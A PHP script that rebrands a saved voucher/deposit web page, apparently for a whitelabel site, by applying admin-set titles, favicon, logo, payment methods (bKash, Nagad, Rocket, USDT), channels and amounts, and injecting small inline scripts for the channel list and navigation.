<?php
/**
 * Serves the saved voucher-center page with the admin-managed configuration
 * applied: brand text, title, favicon, logo, payment methods/channels and the
 * amount options. The original markup is kept untouched in index.html.
 */

$proxyDir = dirname(__DIR__) . '/Proxy';

$app = @include $proxyDir . '/config.php';
$app = is_array($app) ? $app : [];
$brandFrom = (string) ($app['brand_from'] ?? '');
$brandTo   = (string) ($app['brand_to'] ?? '');

require_once $proxyDir . '/admin/store.php';
$content = content_load();

$html = @file_get_contents(__DIR__ . '/index.html');
if ($html === false) {
    http_response_code(500);
    header('Content-Type: text/plain; charset=UTF-8');
    echo 'Voucher page not found.';
    exit;
}

$jflags = JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES
    | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT;
$jenc = function ($v) use ($jflags) {
    return json_encode($v, $jflags);
};

// 0) The saved markup points at a stale "/Vcentere/" base; the image folders
//    live next to this script.
$vcBase = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/voucherCenter/index.php')), '/');
if ($vcBase === '' || $vcBase === '.') {
    $vcBase = '/voucherCenter';
}
$html = str_replace('/Vcentere/', $vcBase . '/', $html);

// 1) Replace legacy brand text (the page was saved from another whitelabel).
$legacyBrands = ['BigAceWin'];
if ($brandFrom !== '') {
    $legacyBrands[] = $brandFrom;
}
if ($brandTo !== '') {
    foreach (array_unique($legacyBrands) as $from) {
        if ($from === '' || strcasecmp($from, $brandTo) === 0) {
            continue;
        }
        $html = preg_replace('/(?<![\w.\/-])' . preg_quote($from, '/') . '(?!\.[a-z])/i', $brandTo, $html);
    }
}

// 2) Title / meta title from the admin panel.
$titles   = $content['titles'] ?? [];
$webTitle = trim((string) ($titles['web_title'] ?? ''));
if ($webTitle !== '') {
    $tEsc = htmlspecialchars($webTitle, ENT_QUOTES);
    $html = preg_replace('/<title>.*?<\/title>/is', '<title>' . $tEsc . '</title>', $html, 1);
    foreach (['name="title"', 'property="og:title"', 'name="twitter:title"'] as $attr) {
        $html = preg_replace(
            '/<meta\s+' . preg_quote($attr, '/') . '\s+content="[^"]*"[^>]*>/i',
            '<meta ' . $attr . ' content="' . $tEsc . '">',
            $html,
            1
        );
    }
}

// 3) Favicon from the admin panel (replaces the upstream/default icons).
$favicon = trim((string) ($content['favicon']['url'] ?? ''));
if ($favicon !== '') {
    $fEsc = htmlspecialchars($favicon, ENT_QUOTES);
    $html = preg_replace_callback('/<link\b[^>]*\brel="[^"]*icon[^"]*"[^>]*>/i', function ($m) use ($fEsc) {
        $tag = $m[0];
        if (preg_match('/(?<![\w-])href="[^"]*"/i', $tag)) {
            return preg_replace('/(?<![\w-])href="[^"]*"/i', 'href="' . $fEsc . '"', $tag, 1);
        }
        return rtrim($tag, '> ') . ' href="' . $fEsc . '">';
    }, $html);
}

// ---------------------------------------------------------------------------
// 4) Voucher page content: payment methods, channels, amounts (admin-driven).
// ---------------------------------------------------------------------------
$vc        = is_array($content['voucher'] ?? null) ? $content['voucher'] : [];
$methodDef = voucher_method_defaults();

// Built-in image locations for each method (used when admin leaves image blank).
$methodImages = [
    'NAGAD'   => $vcBase . '/NAGAD/BN_2_20240312230148421.png',
    'BKASH'   => $vcBase . '/BKASH/BN_2_20240312225413337.png',
    'BKASHSM' => $vcBase . '/BKASHSM/BN_1_20260711012519510.png',
    'NAGADSM' => $vcBase . '/NAGADSM/BN_1_20260711012544019.png',
    'USDT'    => $vcBase . '/USDT/786_CN_1.png',
    'ROCKET'  => $vcBase . '/ROCKET/BN_2_20240312230029166.png',
];

$images    = [];
$names     = [];
$methodCfg = [];
$methodsIn = is_array($vc['methods'] ?? null) ? $vc['methods'] : [];
foreach ($methodDef as $key => $def) {
    $m       = is_array($methodsIn[$key] ?? null) ? $methodsIn[$key] : [];
    $name    = trim((string) ($m['name'] ?? '')) !== '' ? (string) $m['name'] : (string) $def['name'];
    $image   = trim((string) ($m['image'] ?? '')) !== '' ? (string) $m['image'] : ($methodImages[$key] ?? '');
    $enabled = array_key_exists('enabled', $m) ? (bool) $m['enabled'] : true;
    $images[$key]    = $image;
    $names[$key]     = $name;
    $methodCfg[$key] = [
        'enabled' => $enabled,
        'min'     => (int) ($m['min'] ?? 0),
        'max'     => (int) ($m['max'] ?? 0),
    ];
}

$html = preg_replace_callback(
    '/var paymentImages = \{[\s\S]*?\};/',
    function () use ($images, $jenc) {
        return 'var paymentImages = ' . $jenc($images) . ';';
    },
    $html,
    1
);
$html = preg_replace_callback(
    '/var names = \{[^}]*\};/',
    function () use ($names, $jenc) {
        return 'var names = ' . $jenc($names) . ';';
    },
    $html,
    1
);
$html = preg_replace_callback(
    '/try \{ adminConfig = JSON\.parse\(localStorage\.getItem\(\'voucherPaymentConfig\'\)\) \|\| \{\}; \} catch \(e\) \{ adminConfig = \{\}; \}/',
    function () use ($methodCfg, $jenc) {
        return 'adminConfig = ' . $jenc($methodCfg) . ';';
    },
    $html,
    1
);

// The Rocket item is injected by the page itself; rebuild it with the admin
// name and the same label markup the other methods use.
$rocketName = (string) ($names['ROCKET'] ?? 'Rocket');
$rocketJs   = str_replace(['\\', "'"], ['\\\\', "\\'"], $rocketName);
$rocketHtml = '<div class="deposit-icon-bg"><div class="deposit-img-new"><img alt="' . $rocketJs . '"></div></div>'
    . '<div class="desc-content"><div class="desc-info"><div class="vcn-list-text"><p>' . $rocketJs . '</p></div></div></div>';
$html = preg_replace_callback(
    '/rocket\.innerHTML = \'[^\']*\';/',
    function () use ($rocketHtml) {
        return "rocket.innerHTML = '" . $rocketHtml . "';";
    },
    $html,
    1
);

// Amount options.
$amounts = [];
foreach ((array) ($vc['amounts'] ?? []) as $a) {
    $n = (int) preg_replace('/[^\d]/', '', (string) $a);
    if ($n > 0) {
        $amounts[] = $n;
    }
}
if (!$amounts) {
    $amounts = [100, 200, 300, 500, 1000, 3000, 5000, 10000, 30000];
}
$amountItems = '';
foreach ($amounts as $a) {
    $amountItems .= '<div class="fixed-money-item number-mc">' . number_format($a) . '</div>';
}
$html = preg_replace_callback(
    '/(<div class="fixed-money">)[\s\S]*?(<\/div>\s*<div>\s*<div class="inputCon)/',
    function ($m) use ($amountItems) {
        return $m[1] . $amountItems . $m[2];
    },
    $html,
    1
);

// Payment channels (each method has its own list).
$channelsByMethod = [];
foreach ($methodDef as $key => $def) {
    $list = is_array($methodsIn[$key]['channels'] ?? null) ? $methodsIn[$key]['channels'] : voucher_channel_defaults();
    $clean = [];
    foreach ($list as $ch) {
        $label = trim((string) ($ch['label'] ?? ''));
        if ($label === '') {
            continue;
        }
        $clean[] = ['label' => $label, 'enabled' => !array_key_exists('enabled', $ch) || (bool) $ch['enabled']];
    }
    if (!$clean) {
        $clean = voucher_channel_defaults();
    }
    $channelsByMethod[$key] = $clean;
}

// Static fallback list (first method) for pre-hydration / no-JS.
$firstKey     = array_key_first($methodDef);
$chItems      = '';
$firstEnabled = true;
foreach (($channelsByMethod[$firstKey] ?? []) as $ch) {
    $enabled = $ch['enabled'];
    $cls     = ($enabled && $firstEnabled) ? 'ck ' : ' ';
    if ($enabled) {
        $firstEnabled = false;
    }
    $style    = $enabled ? '' : ' style="display:none"';
    $chItems .= '<li class="' . $cls . '"' . $style . '><span class="method-list-info">'
        . htmlspecialchars($ch['label'], ENT_QUOTES) . '</span></li>';
}
$html = preg_replace_callback(
    '/(<div class="\s*vc-v2-method-list\s*">\s*<ul>)[\s\S]*?(<\/ul>)/',
    function ($m) use ($chItems) {
        return $m[1] . $chItems . $m[2];
    },
    $html,
    1
);

// Runtime controller: swap the channel list to the selected method's channels.
$chScript = '<script>(function(){var CH=' . $jenc($channelsByMethod) . ';'
    . 'function keyOf(li){for(var k in CH){if(li&&li.classList&&li.classList.contains(k))return k;}return null;}'
    . 'function tpl(){return document.querySelector("svg.deposit-list-ck");}'
    . 'function mark(li,on){var ex=li.querySelector("svg.deposit-list-ck");if(ex&&ex.parentNode)ex.parentNode.removeChild(ex);if(on){var t=tpl();if(t)li.insertBefore(t.cloneNode(true),li.firstChild);}}'
    . 'function render(key){var list=CH[key];if(!list||!list.length)return;var ul=document.querySelector(".vc-v2-method-list ul");if(!ul)return;ul.innerHTML="";var first=null;'
    . 'list.forEach(function(ch){var li=document.createElement("li");var sp=document.createElement("span");sp.className="method-list-info";sp.textContent=ch.label||"";li.appendChild(sp);if(ch.enabled===false)li.style.display="none";ul.appendChild(li);'
    . 'if(ch.enabled!==false&&!first)first=li;'
    . 'li.addEventListener("click",function(){var all=ul.querySelectorAll("li");for(var i=0;i<all.length;i++){var on=all[i]===li;all[i].classList.toggle("selected",on);all[i].classList.toggle("ck",on);mark(all[i],on);}window.selectedPaymentChannel=ch.label;});'
    . '});if(first)first.click();}'
    . 'function boot(){var ms=document.querySelectorAll("li.change-item-animate");for(var i=0;i<ms.length;i++){(function(li){li.addEventListener("click",function(){var k=keyOf(li);if(k)setTimeout(function(){render(k);},0);});})(ms[i]);}var sel=document.querySelector("li.change-item-animate.selected")||ms[0];if(sel){var k=keyOf(sel);if(k)render(k);}}'
    . 'if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",function(){setTimeout(boot,0);});else setTimeout(boot,0);'
    . '})();</script>';
if (stripos($html, '</body>') !== false) {
    $html = preg_replace('/<\/body>/i', $chScript . '</body>', $html, 1);
} else {
    $html .= $chScript;
}

// 5) Strip save-page artefacts so no old-brand URLs remain in the markup.
$html = preg_replace('/\sdata-savepage-href="[^"]*"/i', '', $html);
$html = preg_replace('/<meta\s+name="savepage-[^"]*"[^>]*>/i', '', $html);

// 6) Logo: swap visible logo images at runtime (voucher logo, else global logo).
$logo = trim((string) ($vc['logo'] ?? ''));
if ($logo === '') {
    $logo = trim((string) ($content['logo']['url'] ?? ''));
}
if ($logo !== '') {
    $logoJson   = $jenc($logo);
    $logoScript = '<script>(function(){var L=' . $logoJson . ';if(!L)return;'
        . 'try{document.documentElement.style.setProperty("--s-logo-loading-logo","url("+L+")");}catch(e){}'
        . 'function s(){var im=document.getElementsByTagName("img");for(var i=0;i<im.length;i++){'
        . 'var v=(im[i].getAttribute("src")||"")+" "+(im[i].className||"");'
        . 'if(/logo/i.test(v)&&im[i].src!==L){im[i].src=L;}}}'
        . 'if(document.readyState!=="loading")s();else document.addEventListener("DOMContentLoaded",s);'
        . 'setInterval(s,1500);})();</script>';
    if (stripos($html, '</body>') !== false) {
        $html = preg_replace('/<\/body>/i', $logoScript . '</body>', $html, 1);
    } else {
        $html .= $logoScript;
    }
}

// 7) Patch navbar links for voucher center navigation.
$navScript = '<script>(function(){'
    . 'function patch(){'
    . 'var left=document.querySelector(".am-navbar-left[onclick],.am-navbar-left .return_icon,.am-navbar-left .shell_return_icon");'
    . 'if(left){var p=left.closest(".am-navbar-left")||left;'
    . 'p.onclick=function(e){e.preventDefault();e.stopPropagation();window.location.href="/m/member/home";};'
    . 'p.style.cursor="pointer";}'
    . 'var right=document.querySelector(".am-navbar-right");'
    . 'if(right){right.onclick=function(e){e.preventDefault();e.stopPropagation();window.location.href="/m/vouReport";};'
    . 'right.style.cursor="pointer";}}'
    . 'if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",function(){setTimeout(patch,100);});'
    . 'else setTimeout(patch,100);'
    . '})();</script>';
if (stripos($html, '</body>') !== false) {
    $html = preg_replace('/<\/body>/i', $navScript . '</body>', $html, 1);
} else {
    $html .= $navScript;
}

header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-cache, must-revalidate');
echo $html;
